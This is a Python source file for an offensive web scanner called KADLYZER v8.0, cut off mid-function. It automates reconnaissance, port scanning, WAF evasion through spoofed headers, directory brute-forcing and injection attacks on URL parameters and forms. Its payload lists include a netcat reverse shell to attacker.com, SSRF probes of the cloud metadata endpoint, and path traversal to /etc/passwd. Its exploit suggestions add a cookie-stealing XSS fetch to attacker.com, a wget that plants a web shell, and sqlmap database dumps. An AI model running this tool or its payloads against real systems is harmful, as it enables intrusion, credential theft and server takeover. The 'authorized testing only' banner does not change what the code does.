import requests
import socket
import json
import threading
import random
import base64
import time
import os
import argparse
import concurrent.futures
from urllib.parse import urlparse, urljoin
import logging
from datetime import datetime
import ssl
import re
import ipaddress

# ==============================
# KADLYZER v8.0 - Enhanced Version
# ==============================

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Advanced WAF bypass headers with rotating techniques
BYPASS_WAF_HEADERS = [
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36", 
     "X-Forwarded-For": "127.0.0.1", 
     "Accept-Language": "en-US,en;q=0.9"},
    
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15", 
     "X-Originating-IP": "127.0.0.1", 
     "Accept-Encoding": "gzip, deflate, br"},
    
    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36", 
     "Referer": "https://www.google.com/", 
     "DNT": "1"},
    
    {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", 
     "CF-Connecting-IP": "127.0.0.1",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
    
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0", 
     "X-Real-IP": "127.0.0.1",
     "Connection": "keep-alive"},
     
    {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1",
     "X-Client-IP": "127.0.0.1",
     "Cache-Control": "max-age=0"},
]

# Enhanced and layered payloads for different vulnerability types
PAYLOADS = {
    "sql_injection": [
        "' OR '1'='1' --",
        "' OR 1=1 #",
        "' UNION SELECT 1,2,3,4,5--",
        "1' OR '1'='1",
        "1' AND 1=0 UNION SELECT null, CONCAT(username,':',password) FROM users --",
        "admin'--",
        base64.b64encode(b"' OR '1'='1' --").decode(),
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<ScRiPt>alert('XSS')</sCrIpT>",
        base64.b64encode(b"<script>alert('XSS')</script>").decode(),
    ],
    "path_traversal": [
        "../../../../etc/passwd",
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "C:\\Windows\\system.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
    ],
    "command_injection": [
        "'; ping -c 4 127.0.0.1 ;'",
        "& whoami &",
        "| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "'; nc -e /bin/sh attacker.com 4444 ;'",
        "; timeout 10 ping -c 4 127.0.0.1 ;",
    ],
    "ssrf": [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "file:///etc/passwd",
        "dict://localhost:11211/stats",
        "gopher://localhost:25/",
        "http://169.254.169.254/latest/meta-data/",
    ],
}

# Common HTTP status codes and their meanings
HTTP_STATUS_CODES = {
    200: "OK",
    201: "Created",
    301: "Moved Permanently",
    302: "Found",
    400: "Bad Request",
    401: "Unauthorized",
    403: "Forbidden",
    404: "Not Found",
    405: "Method Not Allowed",
    500: "Internal Server Error",
    502: "Bad Gateway",
    503: "Service Unavailable",
}

# Common directories to check for sensitive information
COMMON_DIRS = [
    "admin/",
    "login/",
    "wp-admin/",
    "backup/",
    "config/",
    ".git/",
    ".env",
    "api/",
    "phpmyadmin/",
    "dashboard/",
    "wp-content/",
    "administrator/",
    "install/",
    "db/",
    "logs/",
    "temp/",
    "test/",
    "dev/",
]

# Advanced port scanning with service identification
COMMON_PORTS = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    111: "RPC",
    135: "MSRPC",
    139: "NetBIOS",
    143: "IMAP",
    443: "HTTPS",
    445: "SMB",
    993: "IMAPS",
    995: "POP3S",
    1433: "MSSQL",
    1521: "Oracle",
    3306: "MySQL",
    3389: "RDP",
    5432: "PostgreSQL",
    5900: "VNC",
    5985: "WinRM",
    6379: "Redis",
    8080: "HTTP-Proxy",
    8443: "HTTPS-Alt",
    27017: "MongoDB",
}

# Set up logging
def setup_logging():
    log_dir = "logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = os.path.join(log_dir, f"kadlyzer_{timestamp}.log")
    
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger("kadlyzer")

logger = setup_logging()

def banner():
    print(f"""{Colors.CYAN}

██╗  ██╗ █████╗ ██████╗ ██╗  ██╗   ██╗███████╗███████╗██████╗ 
██║ ██╔╝██╔══██╗██╔══██╗██║  ╚██╗ ██╔╝╚══███╔╝██╔════╝██╔══██╗
█████╔╝ ███████║██║  ██║██║   ╚████╔╝   ███╔╝ █████╗  ██████╔╝
██╔═██╗ ██╔══██║██║  ██║██║    ╚██╔╝   ███╔╝  ██╔══╝  ██╔══██╗
██║  ██╗██║  ██║██████╔╝███████╗██║   ███████╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝
                                                              
{Colors.BOLD}{Colors.GREEN}KADLYZER v8.0 - Enhanced Security Testing Tool{Colors.ENDC}
{Colors.WARNING}For authorized security testing only{Colors.ENDC}
    """)

def validate_target(target):
    """Validate and normalize the target input."""
    if not target:
        raise ValueError("Target cannot be empty")
    
    # Add http:// prefix if no scheme provided
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Parse the URL
    parsed_url = urlparse(target)
    domain = parsed_url.netloc
    
    # If domain includes port, strip it for some operations
    if ':' in domain:
        domain = domain.split(':')[0]
    
    return {
        'full_url': target,
        'domain': domain,
        'scheme': parsed_url.scheme,
        'path': parsed_url.path,
        'parsed_url': parsed_url
    }

def recon(target_info):
    """Enhanced reconnaissance function."""
    domain = target_info['domain']
    logger.info(f"Starting reconnaissance on {domain}...")
    
    results = {
        "ip_addresses": [],
        "whois_data": None,
        "dns_records": {},
        "ssl_info": {}
    }
    
    try:
        # Get IP address(es)
        ips = socket.gethostbyname_ex(domain)
        main_ip = ips[2][0]
        results["ip_addresses"] = ips[2]
        logger.info(f"IP Target: {main_ip} (+ {len(ips[2])-1} additional)")

        # Get WHOIS information
        try:
            response = requests.get(f"https://api.hackertarget.com/whois/?q={domain}", timeout=10)
            if response.status_code == 200:
                results["whois_data"] = response.text
                logger.info(f"WHOIS Data retrieved successfully")
            else:
                logger.warning(f"WHOIS request failed: {response.status_code}")
        except Exception as e:
            logger.error(f"WHOIS API error: {str(e)}")

        # Check SSL certificate if HTTPS
        if target_info['scheme'] == 'https':
            try:
                context = ssl.create_default_context()
                with socket.create_connection((domain, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=domain) as ssock:
                        cert = ssock.getpeercert()
                        results["ssl_info"] = {
                            "issuer": dict(x[0] for x in cert['issuer']),
                            "subject": dict(x[0] for x in cert['subject']),
                            "version": cert['version'],
                            "not_before": cert['notBefore'],
                            "not_after": cert['notAfter']
                        }
                        logger.info(f"SSL Certificate: Valid until {cert['notAfter']}")
            except Exception as e:
                logger.error(f"SSL certificate check failed: {str(e)}")

        # Try to get DNS records
        try:
            # A record already retrieved
            results["dns_records"]["A"] = results["ip_addresses"]
            
            # Try for other common record types using hackertarget API
            response = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=10)
            if response.status_code == 200:
                dns_text = response.text
                logger.info(f"DNS records retrieved successfully")
                
                # Parse the DNS records from the text response
                record_types = ["MX", "NS", "CNAME", "TXT", "SOA"]
                for record_type in record_types:
                    pattern = re.compile(rf"{domain}\.\s+\d+\s+IN\s+{record_type}\s+(.*)")
                    matches = pattern.findall(dns_text)
                    if matches:
                        results["dns_records"][record_type] = matches
            else:
                logger.warning(f"DNS lookup request failed: {response.status_code}")
        except Exception as e:
            logger.error(f"DNS lookup error: {str(e)}")

        return results

    except Exception as e:
        logger.error(f"Reconnaissance failed: {str(e)}")
        return results

def scan_ports(target_info, max_threads=100, timeout=1.0, scan_all=False):
    """Enhanced port scanner with service detection"""
    domain = target_info['domain']
    logger.info(f"Starting port scan on {domain}...")
    
    # Determine which ports to scan
    ports_to_scan = list(COMMON_PORTS.keys()) if not scan_all else range(1, 65536)
    
    try:
        ip = socket.gethostbyname(domain)
        open_ports = {}
        
        def check_port(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                result = s.connect_ex((ip, port))
                s.close()
                
                if result == 0:
                    service = COMMON_PORTS.get(port, "Unknown")
                    # Try banner grabbing for additional info
                    banner = grab_banner(ip, port)
                    open_ports[port] = {
                        "service": service,
                        "banner": banner
                    }
                    logger.info(f"Port {port} ({service}) is open")
            except Exception as e:
                pass
        
        # Use thread pool for faster scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(check_port, ports_to_scan)
        
        if open_ports:
            logger.info(f"Found {len(open_ports)} open ports")
            for port, info in sorted(open_ports.items()):
                logger.info(f"  {port}/tcp - {info['service']}" + (f" - {info['banner']}" if info['banner'] else ""))
        else:
            logger.warning("No open ports found")
        
        return open_ports
        
    except Exception as e:
        logger.error(f"Port scanning failed: {str(e)}")
        return {}

def grab_banner(ip, port, timeout=2):
    """Attempt to grab service banner from open port"""
    banner = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        
        # For HTTP/HTTPS ports, send a HTTP request
        if port in [80, 443, 8080, 8443]:
            s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
        else:
            # For other ports, just wait for banner
            pass
        
        banner_data = s.recv(1024)
        banner = banner_data.decode('utf-8', errors='ignore').strip()
        # Truncate banner if too long
        if len(banner) > 40:
            banner = banner[:37] + "..."
    except:
        pass
    finally:
        try:
            s.close()
        except:
            pass
    return banner

def bypass_waf(target_info):
    """Enhanced WAF detection and bypass attempts"""
    url = target_info['full_url']
    logger.info(f"Testing WAF presence and bypass methods on {url}...")
    
    waf_results = {
        "waf_detected": False,
        "waf_type": None,
        "bypass_successful": False,
        "successful_method": None,
        "fingerprints": []
    }
    
    # First, check standard response
    try:
        standard_response = requests.get(url, timeout=10, allow_redirects=True)
        standard_headers = standard_response.headers
        
        # Check for WAF fingerprints in headers
        waf_fingerprints = {
            "Cloudflare": ["cf-ray", "cloudflare"],
            "AWS WAF": ["x-amzn-waf"],
            "Akamai": ["akamai"],
            "Imperva": ["incapsula"],
            "F5 BIG-IP ASM": ["x-f5-id"],
            "ModSecurity": ["mod_security"],
            "Sucuri": ["sucuri"]
        }
        
        for waf_name, signatures in waf_fingerprints.items():
            for header_key, header_value in standard_headers.items():
                for signature in signatures:
                    if signature.lower() in header_key.lower() or signature.lower() in header_value.lower():
                        waf_results["waf_detected"] = True
                        waf_results["waf_type"] = waf_name
                        waf_results["fingerprints"].append(f"{header_key}: {header_value}")
                        logger.info(f"WAF detected: {waf_name}")
                        break
        
        # If no specific WAF identified by headers, check for behavior
        if not waf_results["waf_detected"]:
            # Send a simple payload that would trigger most WAFs
            test_url = url + "?test=<script>alert(1)</script>"
            test_response = requests.get(test_url, timeout=10)
            
            # Check if response differs substantially or returns security error pages
            if test_response.status_code in [403, 406, 429, 503] or "security" in test_response.text.lower() or "blocked" in test_response.text.lower():
                waf_results["waf_detected"] = True
                waf_results["waf_type"] = "Unknown WAF"
                logger.info(f"Generic WAF detected based on behavior")
        
        # Now try various bypass techniques
        if waf_results["waf_detected"]:
            for i, header in enumerate(BYPASS_WAF_HEADERS):
                try:
                    bypass_response = requests.get(url, headers=header, timeout=10)
                    if bypass_response.status_code == 200:
                        logger.info(f"Potential WAF bypass with headers: {header}")
                        # Verify bypass with a light test payload
                        test_url = url + "?id=1' or '1'='1"
                        test_with_headers = requests.get(test_url, headers=header, timeout=10)
                        
                        if test_with_headers.status_code == 200 and "forbidden" not in test_with_headers.text.lower():
                            waf_results["bypass_successful"] = True
                            waf_results["successful_method"] = f"Method {i+1}"
                            logger.info(f"WAF bypass confirmed with method {i+1}")
                            break
                except Exception as e:
                    logger.debug(f"Bypass attempt {i+1} failed: {str(e)}")
                    
            if not waf_results["bypass_successful"]:
                logger.warning("Could not bypass WAF with standard methods")
        else:
            logger.info("No WAF detected")
    
    except Exception as e:
        logger.error(f"WAF detection failed: {str(e)}")
    
    return waf_results

def directory_scan(target_info, threads=10):
    """Scan for common directories and files"""
    base_url = target_info['full_url']
    logger.info(f"Scanning for sensitive directories and files on {base_url}...")
    
    found_dirs = {}
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_dir = {executor.submit(check_directory, base_url, directory): directory for directory in COMMON_DIRS}
        for future in concurrent.futures.as_completed(future_to_dir):
            directory = future_to_dir[future]
            try:
                result = future.result()
                if result:
                    found_dirs[directory] = result
                    logger.info(f"Found: {result['url']} ({result['status_code']} - {result['content_length']} bytes)")
            except Exception as e:
                logger.debug(f"Error checking {directory}: {str(e)}")
    
    if not found_dirs:
        logger.info("No interesting directories found")
    else:
        logger.info(f"Found {len(found_dirs)} interesting directories/files")
    
    return found_dirs

def check_directory(base_url, directory):
    """Check if a directory exists and collect information about it"""
    url = urljoin(base_url, directory)
    try:
        headers = random.choice(BYPASS_WAF_HEADERS)
        response = requests.get(url, headers=headers, timeout=5, allow_redirects=False)
        
        # Only return "interesting" results (not 404s)
        if response.status_code != 404:
            return {
                "url": url,
                "status_code": response.status_code,
                "status": HTTP_STATUS_CODES.get(response.status_code, "Unknown"),
                "content_length": len(response.content),
                "title": extract_title(response.text) if response.headers.get('content-type', '').startswith('text/html') else None
            }
        return None
    except:
        return None

def extract_title(html):
    """Extract title from HTML content"""
    match = re.search(r"<title>(.*?)</title>", html, re.IGNORECASE)
    if match:
        return match.group(1)
    return None

def vulnerability_scan(target_info, waf_bypass_headers=None):
    """Comprehensive vulnerability scanning"""
    url = target_info['full_url']
    logger.info(f"Starting vulnerability scan on {url}...")
    
    vulnerabilities = {}
    
    # Use WAF bypass headers if available, otherwise use random headers
    if not waf_bypass_headers or not isinstance(waf_bypass_headers, dict):
        headers = random.choice(BYPASS_WAF_HEADERS)
    else:
        headers = waf_bypass_headers
    
    # First, collect all input points (parameters)
    input_points = discover_parameters(url, headers)
    
    # Test each vulnerability type against each input point
    for vuln_type, payloads in PAYLOADS.items():
        vulnerabilities[vuln_type] = []
        
        for input_point in input_points:
            for payload in payloads:
                try:
                    test_url = f"{url}?{input_point}={payload}" if "?" not in url else f"{url}&{input_point}={payload}"
                    response = requests.get(test_url, headers=headers, timeout=10)
                    
                    # Check for signs of successful exploitation
                    if check_vulnerability(vuln_type, payload, response):
                        vuln_detail = {
                            "parameter": input_point,
                            "payload": payload,
                            "url": test_url,
                            "evidence": extract_evidence(vuln_type, response)
                        }
                        vulnerabilities[vuln_type].append(vuln_detail)
                        logger.warning(f"Potential {vuln_type} vulnerability found in parameter '{input_point}' with payload: {payload}")
                        # Break after finding one vulnerability of this type in this parameter
                        break
                except Exception as e:
                    logger.debug(f"Error testing {vuln_type} on {input_point}: {str(e)}")
    
    # Form-based vulnerability testing
    form_vulnerabilities = scan_forms(url, headers)
    for vuln_type, vulns in form_vulnerabilities.items():
        if vuln_type in vulnerabilities:
            vulnerabilities[vuln_type].extend(vulns)
        else:
            vulnerabilities[vuln_type] = vulns
    
    # Count total vulnerabilities
    total_vulns = sum(len(vulns) for vulns in vulnerabilities.values())
    if total_vulns > 0:
        logger.warning(f"Found {total_vulns} potential vulnerabilities")
    else:
        logger.info("No obvious vulnerabilities detected")
    
    return vulnerabilities

def discover_parameters(url, headers):
    """Discover potential input parameters"""
    try:
        response = requests.get(url, headers=headers, timeout=10)
        html = response.text
        
        # Common parameter names to check
        common_params = ["id", "page", "file", "query", "search", "q", "s", "url", "p", "action", "dir", "path"]
        
        # Extract parameters from URL if they exist
        parsed = urlparse(url)
        existing_params = []
        if parsed.query:
            existing_params = [param.split('=')[0] for param in parsed.query.split('&')]
        
        # Extract potential parameters from HTML forms
        form_params = []
        input_pattern = re.compile(r'<input.*?name=["\']([^"\']+)["\']', re.IGNORECASE)
        form_params = input_pattern.findall(html)
        
        # Combine all discovered parameters
        all_params = list(set(existing_params + form_params + common_params))
        
        return all_params
    except Exception as e:
        logger.error(f"Parameter discovery failed: {str(e)}")
        return ["id", "page", "file", "search"]  # Return default parameters

def scan_forms(url, headers):
    """Scan HTML forms for vulnerabilities"""
    form_vulnerabilities = {vuln_type: [] for vuln_type in PAYLOADS.keys()}
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        html = response.text
        
        # Simple form extraction
        form_pattern = re.compile(r'<form.*?action=["\']([^"\']*)["\'].*?>(.*?)</form>', re.DOTALL | re.IGNORECASE)
        input_pattern = re.compile(r'<input.*?name=["\']([^"\']+)["\']', re.IGNORECASE)
        
        forms = form_pattern.findall(html)
        
        for form_action, form_content in forms:
            # Determine form action URL
            if not form_action:
                form_action = url
            elif not form_action.startswith(('http://', 'https://')):
                form_action = urljoin(url, form_action)
            
            # Extract input fields
            input_fields = input_pattern.findall(form_content)
            
            # Test each form field with specific payloads
            for field in input_fields:
                # Only test common vulnerable fields (skip CSRF tokens, etc.)
                if any(vuln_field in field.lower() for vuln_field in ["user", "pass", "login", "search", "query", "id", "name", "email"]):
                    for vuln_type, payloads in PAYLOADS.items():
                        # Only try first two payloads for forms to reduce noise
                        for payload in payloads[:2]:
                            data = {input_field: "" for input_field in input_fields}
                            data[field] = payload
                            
                            try:
                                form_response = requests.post(form_action, headers=headers, data=data, timeout=10, allow_redirects=True)
                                
                                if check_vulnerability(vuln_type, payload, form_response):
                                    vuln_detail = {
                                        "parameter": field,
                                        "payload": payload,
                                        "url": form_action,
                                        "method": "POST",
                                        "evidence": extract_evidence(vuln_type, form_response)
                                    }
                                    form_vulnerabilities[vuln_type].append(vuln_detail)
                                    logger.warning(f"Potential {vuln_type} vulnerability found in form field '{field}' with payload: {payload}")
                                    break
                            except Exception as e:
                                logger.debug(f"Error testing form field {field}: {str(e)}")
    except Exception as e:
        logger.error(f"Form scanning failed: {str(e)}")
    
    return form_vulnerabilities

def check_vulnerability(vuln_type, payload, response):
    """Check if the response indicates a successful exploitation"""
    content = response.text.lower()
    
    if vuln_type == "sql_injection":
        # Look for SQL error messages or signs of successful injection
        sql_errors = ["sql syntax", "mysql error", "ora-", "postgresql error", "sqlite", "syntax error"]
        return any(error in content for error in sql_errors) or response.status_code == 500
    
    elif vuln_type == "xss":
        # For XSS, check if the payload is reflected in the response
        sanitized_payload = payload.lower().replace(" ", "")
        return sanitized_payload in content.replace(" ", "")
    
    elif vuln_type == "path_traversal":
        # Look for signs of successful file reading
        lfi_signs = ["root:x:", "www-data", "[boot loader]", "lp:x:", "daemon:x:"]
        return any(sign in content for sign in lfi_signs)
    
    elif vuln_type == "command_injection":
        # Look for command output signatures
        cmd_signs = ["uid=", "gid=", "groups=", "linux", "windows", "users"]
        return any(sign in content for sign in cmd_signs) or response.status_code == 500
    
    elif vuln_type == "ssrf":
        # SSRF often causes delays or returns unexpected content
        return "localhost" in content or "127.0.0.1" in content or "internal" in content
    
    return False

def extract_evidence(vuln_type, response):
    """Extract evidence of vulnerability from response"""
    content = response.text
    
    if vuln_type == "sql_injection":
        # Extract SQL error messages
        sql_patterns = [
            re.compile(r"(SQL syntax.*?ERROR|mysql_fetch_array\(\)|mysql_fetch_assoc\(\)|mysql_num_rows\(\))"),
            re.compile(r"(ORA-[0-9]{4,5}|Oracle error)"),
            re.compile(r"(Microsoft SQL Server|ODBC Driver|OLE DB Provider)"),
            re.compile(r"(PostgreSQL.*?ERROR|pg_.*?ERROR)")
        ]
        for pattern in sql_patterns:
            match = pattern.search(content)
            if match:
                return match.group(0)
    
    elif vuln_type == "xss":
        # Find reflected payload
        xss_patterns = [
            re.compile(r"(<script>.*?</script>)"),
            re.compile(r"(<img.*?onerror=.*?>)"),
            re.compile(r"(<svg.*?onload=.*?>)")
        ]
        for pattern in xss_patterns:
            match = pattern.search(content)
            if match:
                return match.group(0)
    
    elif vuln_type == "path_traversal":
        # Extract file content snippets
        lfi_patterns = [
            re.compile(r"(root:.*?:[0-9]+:[0-9]+:)"),
            re.compile(r"(\[boot loader\].*?\[operating systems\])"),
            re.compile(r"(etc/passwd)"),
            re.compile(r"(windows\\system32\\)")
        ]
        for pattern in lfi_patterns:
            match = pattern.search(content)
            if match:
                return match.group(0)
    
    elif vuln_type == "command_injection":
        # Extract command output
        cmd_patterns = [
            re.compile(r"(uid=[0-9]+\([a-z]+\).*?gid=[0-9]+)"),
            re.compile(r"(Directory of .*)"),
            re.compile(r"([0-9]+ File\(s\) [0-9]+ bytes)")
        ]
        for pattern in cmd_patterns:
            match = pattern.search(content)
            if match:
                return match.group(0)
    
    # If no specific pattern matched, return a snippet of the response
    if len(content) > 200:
        return content[:197] + "..."
    return content

def exploit_suggestion(vulnerabilities, target_info):
    """Provide targeted exploit suggestions based on discovered vulnerabilities"""
    logger.info("Generating exploit suggestions...")
    
    suggestions = []
    
    # Total count of vulnerabilities
    vuln_count = sum(len(vulns) for vuln_type, vulns in vulnerabilities.items())
    
    if vuln_count == 0:
        suggestions.append({
            "type": "general",
            "title": "No obvious vulnerabilities detected",
            "description": "Consider deeper manual testing or using specialized tools",
            "tools": ["Burp Suite Pro", "OWASP ZAP", "Metasploit"]
        })
    else:
        # Generate specific suggestions for each vulnerability type
        for vuln_type, vulns in vulnerabilities.items():
            if not vulns:
                continue
                
            if vuln_type == "sql_injection":
                suggestions.append({
                    "type": "sql_injection",
                    "title": f"SQL Injection ({len(vulns)} potential points)",
                    "description": "Database access and manipulation possible",
                    "commands": [
                        f"sqlmap -u \"{target_info['full_url']}?{vulns[0]['parameter']}=1\" --dbs --batch",
                        f"sqlmap -u \"{target_info['full_url']}?{vulns[0]['parameter']}=1\" --dbs --batch --technique=U",
                        f"sqlmap -u \"{target_info['full_url']}\" --forms --batch"
                    ],
                    "affected_params": [v['parameter'] for v in vulns]
                })
            
            elif vuln_type == "xss":
                suggestions.append({
                    "type": "xss",
                    "title": f"Cross-Site Scripting ({len(vulns)} potential points)",
                    "description": "Client-side code execution possible",
                    "payloads": [
                        "<img src=x onerror=alert(document.cookie)>",
                        "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                        "<svg onload=\"eval(atob('base64-encoded-js-payload'))\">",
                    ],
                    "affected_params": [v['parameter'] for v in vulns]
                })
            
            elif vuln_type == "path_traversal":
                suggestions.append({
                    "type": "path_traversal",
                    "title": f"Path Traversal ({len(vulns)} potential points)",
                    "description": "File system access possible",
                    "paths_to_try": [
                        "/etc/passwd",
                        "/etc/shadow",
                        "/var/www/html/config.php",
                        "C:\\Windows\\win.ini",
                        "../../../wp-config.php"
                    ],
                    "affected_params": [v['parameter'] for v in vulns]
                })
            
            elif vuln_type == "command_injection":
                suggestions.append({
                    "type": "command_injection",
                    "title": f"Command Injection ({len(vulns)} potential points)",
                    "description": "Server command execution possible",
                    "commands": [
                        ";id",
                        "| cat /etc/passwd",
                        "& whoami",
                        "; ping -c 1 attacker.com",
                        "; wget http://attacker.com/shell.php -O /var/www/html/shell.php"
                    ],
                    "affected_params": [v['parameter'] for v in vulns]
                })
            
            elif vuln_type == "ssrf":
                suggestions.append({
                    "type": "ssrf",
                    "title": f"Server-Side Request Forgery ({len(vulns)} potential points)",
                    "description": "Internal network access possible",
                    "targets": [
                        "http://localhost:8080/admin",
                        "http://127.0.0.1/phpinfo.php",
                        "http://169.254.169.254/latest/meta-data/",
                        "file:///etc/passwd",
                        "http://internal-service:8080/"
                    ],
                    "affected_params": [v['parameter'] for v in vulns]
                })
    
    return suggestions

def generate_report(target_info, results):
    """Generate a comprehensive report of all findings"""
    logger.info("Generating final report...")
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_dir = "reports"
    if not os.path.exists(report_dir):
        os.makedirs(report_dir)
    
    # Create report filename
    domain = target_info['domain']
    report_filename = os.path.join(report_dir, f"kadlyzer_report_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
    
    # Prepare JSON report
    report = {
        "scan_info": {
            "target": target_info['full_url'],
            "domain": domain,
            "timestamp": timestamp,
            "kadlyzer_version": "8.0"
        },
        "summary": {
            "reconnaissance": {
                "ip_addresses": results.get("recon", {}).get("ip_addresses", []),
                "dns_records_count": len(results.get("recon", {}).get("dns_records", {}))
            },
            "ports": {
                "open_ports_count": len(results.get("ports", {})),
                "critical_services": [f"{port} ({info['service']})" for port, info in results.get("ports", {}).items() 
                                     if info['service'] in ["SSH", "FTP", "MySQL", "PostgreSQL", "Redis", "MongoDB", "MSSQL"]]
            },
            "waf": {
                "detected": results.get("waf", {}).get("waf_detected", False),
                "type": results.get("waf", {}).get("waf_type", None),
                "bypassed": results.get("waf", {}).get("bypass_successful", False)
            },
            "directories": {
                "sensitive_dirs_count": len(results.get("directories", {})),
                "critical_findings": [url for dir_name, dir_info in results.get("directories", {}).items() 
                                     if dir_info['status_code'] in [200, 301, 302] and 
                                     any(critical in dir_name.lower() for critical in ["admin", "config", "backup", ".git", ".env"])]
            },
            "vulnerabilities": {
                "total_count": sum(len(vulns) for vulns in results.get("vulnerabilities", {}).values()),
                "types_found": [vuln_type for vuln_type, vulns in results.get("vulnerabilities", {}).items() if vulns]
            }
        },
        "details": results,
        "risk_score": calculate_risk_score(results),
        "recommendations": generate_recommendations(results)
    }
    
    # Write JSON report
    with open(f"{report_filename}.json", "w") as f:
        json.dump(report, f, indent=4)
    
    # Generate HTML report for better visualization
    html_report = generate_html_report(report)
    with open(f"{report_filename}.html", "w") as f:
        f.write(html_report)
    
    logger.info(f"Report saved to {report_filename}.json and {report_filename}.html")
    
    return {
        "json_path": f"{report_filename}.json",
        "html_path": f"{report_filename}.html",
        "summary": report["summary"],
        "risk_score": report["risk_score"]
    }

def calculate_risk_score(results):
    """Calculate overall risk score based on findings"""
    score = 0
    max_score = 100
    
    # Scoring factors
    waf_present = results.get("waf", {}).get("waf_detected", False)
    open_ports = results.get("ports", {})
    sensitive_dirs = results.get("directories", {})
    vulnerabilities = results.get("vulnerabilities", {})
    
    # Base score of 20 for all targets
    score = 20
    
    # Add points for security measures
    if waf_present:
        score -= 10  # WAF presence reduces risk
        if not results.get("waf", {}).get("bypass_successful", False):
            score -= 5  # Non-bypassable WAF reduces risk further
    
    # Add points for open ports
    for port, info in open_ports.items():
        if port in [22, 3389]:  # SSH, RDP
            score += 5
        elif port in [21, 23, 3306, 1433, 5432, 6379, 27017]:  # FTP, Telnet, Databases
            score += 8
        else:
            score += 2
    
    # Cap port risk at 25
    port_score = score - 20
    if port_score > 25:
        score = 20 + 25
    
    # Add points for sensitive directories
    for dir_name, dir_info in sensitive_dirs.items():
        if "admin" in dir_name.lower() or "login" in dir_name.lower():
            score += 5
        elif "backup" in dir_name.lower() or "config" in dir_name.lower():
            score += 8
        elif ".git" in dir_name.lower() or ".env" in dir_name.lower():
            score += 10
        else:
            score += 3
    
    # Cap directory risk at 20
    dir_score = score - (20 + min(port_score, 25))
    if dir_score > 20:
        score = 20 + min(port_score, 25) + 20
    
    # Add points for vulnerabilities
    vuln_weights = {
        "sql_injection": 10,
        "command_injection": 10,
        "path_traversal": 8,
        "xss": 6,
        "ssrf": 8
    }
    
    for vuln_type, vulns in vulnerabilities.items():
        if vuln_type in vuln_weights and vulns:
            # Add points for each vulnerability, but with diminishing returns
            score += vuln_weights[vuln_type] * min(len(vulns), 3)
    
    # Ensure score stays within bounds
    score = min(max(score, 0), max_score)
    
    # Risk categorization
    risk_level = "Low"
    if score >= 75:
        risk_level = "Critical"
    elif score >= 50:
        risk_level = "High"
    elif score >= 25:
        risk_level = "Medium"
    
    return {
        "score": score,
        "max_score": max_score,
        "level": risk_level,
        "factors": {
            "waf_present": waf_present,
            "open_ports_count": len(open_ports),
            "sensitive_dirs_count": len(sensitive_dirs),
            "vulnerabilities_count": sum(len(vulns) for vulns in vulnerabilities.values())
        }
    }

def generate_recommendations(results):
    """Generate security recommendations based on findings"""
    recommendations = []
    
    # WAF recommendations
    waf_data = results.get("waf", {})
    if not waf_data.get("waf_detected", False):
        recommendations.append({
            "category": "WAF",
            "title": "Implement Web Application Firewall",
            "description": "No WAF detected. Consider implementing a WAF solution like Cloudflare, AWS WAF, or ModSecurity.",
            "priority": "High"
        })
    elif waf_data.get("bypass_successful", False):
        recommendations.append({
            "category": "WAF",
            "title": "Improve WAF Configuration",
            "description": f"Current WAF ({waf_data.get('waf_type', 'Unknown')}) configuration can be bypassed. Review and strengthen rules.",
            "priority": "High"
        })
    
    # Port security recommendations
    open_ports = results.get("ports", {})
    critical_ports = [port for port, info in open_ports.items() if port in [21, 23, 3306, 1433, 5432, 6379, 27017]]
